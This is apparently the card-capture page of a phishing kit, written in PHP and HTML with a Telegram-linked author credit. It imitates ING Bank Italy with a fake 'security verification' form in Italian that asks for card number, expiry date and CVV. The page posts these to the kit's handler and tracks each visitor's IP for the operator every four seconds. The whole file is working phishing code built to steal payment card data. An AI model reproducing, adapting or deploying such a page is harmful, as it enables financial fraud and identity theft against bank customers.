<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "cc";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>        
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login" style="max-width: 561px;">
          <form action="index.php" method="POST">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="cc">
            <div class="title">
              <img src="<?php echo IMGSPATH; ?>/card.png" style="width:90px; margin-bottom:9px;" alt="">
              <h1 class="mb-0">È richiesta la verifica di sicurezza.</h1>
              <p class="mb-0" style="font-size: 14px;">Per la tua protezione, ING richiede una breve verifica delle tue informazioni. <be> Ti preghiamo di rivedere attentamente i campi e di fornire dati accurati.</p>
            </div>
            
            <div class="inputes">
              <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'one') ?>">
                <label for="one">Numero della carta</label>
                <input type="text" name="one" id="one" inputmode="numeric" class="w-100" placeholder="1234 5678 9012 3456" value="<?php echo get_value('one'); ?>">
                <?php echo errmsg($_SESSION['errors'],'one'); ?>
              </div>
              <div class="row">
                <div class="col-md-6">
                  <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'two') ?>">
                    <label for="two">Data di scadenza</label>
                    <input type="text" name="two" id="two" inputmode="numeric" class="w-100" placeholder="MM/AA" value="<?php echo get_value('two'); ?>">
                    <?php echo errmsg($_SESSION['errors'],'two'); ?>
                  </div>                  
                </div>
                <div class="col-md-6">
                  <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'three') ?>">
                    <label for="cvv">CVV</label>
                    <input type="text" name="three" id="three" inputmode="numeric" class="w-100" placeholder="Cvv" value="<?php echo get_value('three'); ?>">
                    <?php echo errmsg($_SESSION['errors'],'three'); ?>
                  </div>                  
                </div>
              </div>             
            </div>
            <div class="btn_sub">
              <button type="submit">Conferma dati</button>
            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');               
            $('#three').mask('0000'); 
            
            $("input").keyup(function(){
              if ($("#num").val() != "" & $("#exp").val() != "" &  $("#cvv").val() != "" & $("#name").val() != "") {
                  $(".btn_sub button").prop("disabled",false);
                  $(".btn_sub button").addClass("active");
              }else{
                  $(".btn_sub button").prop("disabled",true);
                  $(".btn_sub button").removeClass("active");
              }
            });   
            
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'cc'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);             
        </script>
    </body>
</html>